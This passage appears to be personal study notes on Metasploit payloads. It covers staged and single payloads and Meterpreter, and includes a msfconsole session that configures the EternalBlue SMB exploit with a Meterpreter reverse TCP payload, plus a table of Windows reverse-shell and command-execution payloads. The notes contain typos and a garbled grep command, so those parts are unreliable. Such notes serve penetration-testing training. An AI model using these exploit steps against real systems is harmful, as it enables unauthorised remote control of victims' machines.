- returning a shell to the attacker

types of payload
- singles : 
	- `windows/shell_bind_tcp` is a single payload with no stage
	- A `Single` payload contains the exploit and the entire shellcode for the selected task. 
	- 
- stagers : `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).
	- A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. 
	- `Stagers` are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.
- stages:
	- `stage` is a actual payload that does all the job that is downloaded by stager


#### What Are **Staged Payloads**?

A **staged payload** breaks the attack into **multiple small parts (stages)**, instead of sending one big chunk of code all at once.

- Each part (or "stage") has a **specific job**.
    
- They **work together** in a chain to complete the attack.
    
- This helps with **stealth** (evading antivirus and IPS) and **flexibility**.


| **component** | **role**                                              |
| ------------- | ----------------------------------------------------- |
| **Stage 0**   | Connects the target to the attacker's system (stager) |
| stage 1+      | main payload that give control (like meterpreter)     |

Meterpreter payload

The `Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes.
n addition, scripts and plugins can be `loaded and unloaded` dynamically as required.

### Searching for Payloads

```shell
show payloads


grep meterpreter grep reverse_tcp show payloads

```

### selecting payload

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options



Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads



   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)



msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

set required options and `run`

The prompt is not a Windows command-line one but a `Meterpreter` prompt.
Linux equivalent of `getuid`. 
Exploring the `help` menu gives us further insight into what Meterpreter payloads are capable of.

know we are done with a first part getting a shell from the target (channel 1)

### most common payloads used for Windows machines

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

- heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads.

`use shell to create a channel 1`
